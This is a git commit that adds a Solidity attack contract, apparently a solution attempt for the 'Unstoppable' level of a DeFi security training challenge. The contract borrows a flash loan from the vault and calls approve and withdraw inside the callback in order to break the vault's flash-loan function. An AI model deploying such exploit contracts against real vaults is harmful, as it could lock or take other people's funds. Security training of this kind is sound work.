8684dbaff032cca2c64092413b8a0e3c632b9496
kkeaveney <kevinkeaveney@gmail.com>
2023-03-08 18:41:49 +0000

    ERC20 vault approval

---
+++ src/unStoppable/UnstoppableVaultAttack.sol
@@ -0,0 +1,34 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "solmate/src/utils/FixedPointMathLib.sol";
+import "solmate/src/utils/ReentrancyGuard.sol";
+import {SafeTransferLib, ERC4626, ERC20} from "solmate/src/mixins/ERC4626.sol";
+import "solmate/src/auth/Owned.sol";
+import {IERC3156FlashBorrower, IERC3156FlashLender} from "openzeppelin/interfaces/IERC3156.sol";
+import "openzeppelin/token/ERC721/ERC721.sol";
+import "./UnstoppableVault.sol";
+
+contract UnstoppableVaultAttack is IERC3156FlashBorrower {
+    UnstoppableVault vault;
+
+    constructor(address vaultAddress) {
+        vault = UnstoppableVault(vaultAddress);
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata
+    ) external returns (bytes32) {
+        ERC20(token).approve(address(vault), amount);
+        vault.withdraw(1, address(this), address(this));
+        return keccak256("IERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function attack(uint256 value) external {
+        vault.flashLoan(this, address(vault.asset()), value, bytes(""));
+    }
+}
